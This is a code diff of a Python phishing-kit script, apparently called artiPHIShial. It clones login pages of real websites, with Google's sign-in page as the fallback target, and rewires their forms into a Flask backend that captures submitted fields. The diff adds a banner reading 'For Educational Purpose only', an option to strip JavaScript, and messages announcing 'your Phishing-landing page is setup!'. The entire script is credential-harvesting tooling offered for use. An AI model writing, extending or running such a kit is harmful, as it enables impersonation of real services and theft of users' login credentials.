@@ -1,6 +1,5 @@
 import os
 import clone
-import screenshot
 import mainhtml
 import requests
 from bs4 import BeautifulSoup
@@ -8,7 +7,6 @@ from termcolor import colored
 import implement_backend as backend
 from urllib.parse import urlparse
 import pickle
-import maincss
 import subprocess
 
 
@@ -37,8 +35,23 @@ login_link = []
 uniquestrings = []
 finallinks = []
 
-print("1... Link to website")
-print("2... Link to Loginsite")
+
+print(colored("             _   _ _____  _    _ _____  _____ _    _ _       _ ","blue"))
+print(colored("            | | (_)  __ \| |  | |_   _|/ ____| |  | (_)     | |","blue"))
+print(colored("   __ _ _ __| |_ _| |__) | |__| | | | | (___ | |__| |_  __ _| |","blue"))
+print(colored("  / _` | '__| __| |  ___/|  __  | | |  \___ \|  __  | |/ _` | |","blue"))
+print(colored(" | (_| | |  | |_| | |    | |  | |_| |_ ____) | |  | | | (_| | |","blue"))
+print(colored("  \__,_|_|   \__|_|_|    |_|  |_|_____|_____/|_|  |_|_|\__,_|_|","blue"))
+print(colored("For Educational Purpose only","red"))
+print("----created by----")  
+print("@d0vey")
+print("@gingapower")   
+print("------------------")                                                            
+                                                               
+
+
+print("1 ~ Link to Website (Script will search for Loginpage)")
+print("2 ~ Link to Loginsite (Direct clone of webpage)")
 menu = int(input("Enter Option: "))
 url = input("Enter a URL: ")
 urlpath = cwd + "\\url"
@@ -63,25 +76,29 @@ doc = BeautifulSoup(result, "html.parser")
 with open('output.html', 'w', encoding="utf-8") as file:
     file.write(str(doc))
 
-
-#Functions
 mainhtml.find_links(doc, links_with_text)
-#check if input field
+
+#mainmenu
 if menu == 2:
         print(colored("Start to clone Loginpage!","blue"))
         clone.download_website(url)
-        screenshot.take_screenshot(url, 'screenhot.png')
+        print(colored("Now setting up Flask backend app - ", "blue"))
+        print(colored("Do you want to exclude JavaScript from the Webpage?", "blue"))
+        print("[0] use JS")
+        print("[1] don't use JS")
+        js= int(input(" "))
         backend.copy_files(urlparse(url).netloc, "index.html")
         backend.implement_form()
         inputlist =[]
         inputnames = []
-        
-        backend.delete_scripts()
+        if js == 1:
+            backend.delete_scripts()
         backend.get_vars_for_flask(inputlist, inputnames)
         with open('data.pkl', 'wb') as f:
             pickle.dump(inputnames, f)
-            
-        subprocess.run(["python", python_file_path])
+        print(colored("your Phishing-landing page is setup!","green"))
+        print("you can start your flaskapp")
+        print("py flaskapp.py")
 else:  
         mainhtml.check_links(links_with_text, link_var, login_link)
         mainhtml.find_links_title(doc, link_var, login_link)
@@ -91,7 +108,6 @@ else:
             print(colored("Google Login found", "green"))
             print("url: https://accounts.google.com/")
             clone.download_website("https://accounts.google.com/")
-            screenshot.take_screenshot("https://accounts.google.com/", 'screenhot.png')
             backend.copy_files("accounts.google.com", "index.html")
             backend.implement_form()
             inputlist =[]
@@ -101,7 +117,10 @@ else:
             with open('data.pkl', 'wb') as f:
                 pickle.dump(inputnames, f)
             
-            subprocess.run(["python", python_file_path])
+            print(colored("your Phishing-landing page is setup!","green"))
+            print("you can start your flaskapp")
+            print("py flaskapp.py")
+        
         elif len(login_link) > 0:
             print(colored("Loginlink found!", "green"))
             mainhtml.buildurl(login_link, url)
@@ -117,20 +136,26 @@ else:
             print(colored(link,"yellow"))
             postion= int(input("which link you want to use? "))
             clone.download_website(link[postion-1])
-            screenshot.take_screenshot(link[postion-1], 'screenhot.png')
+            
+            print(colored("Now setting up Flask backend app - ", "blue"))
+            print(colored("Do you want to exclude JavaScript from the Webpage?", "blue"))
+            print("[0] use JS")
+            print("[1] don't use JS")
+            js= int(input(" "))
             backend.copy_files(urlparse(link[postion-1]).netloc, "index.html")
             backend.implement_form()
             inputlist =[]
             inputnames = []
-            if url == "https://facebook.com":#facebook blocks pass input field
+            if js == 1:
                 backend.delete_scripts()
             backend.delete_scripts()
             backend.get_vars_for_flask(inputlist, inputnames)
             with open('data.pkl', 'wb') as f:
                 pickle.dump(inputnames, f)
-            
-            subprocess.run(["python", python_file_path])
+            print(colored("your Phishing-landing page is setup!","green"))
+            print("you can start your flaskapp")
+            print("py flaskapp.py")
         else:
             print(colored("No Loginlink found!", "red"))
-            print(colored("Now we let AI do its job!","blue"))
-            maincss.main(url)
+        
+            
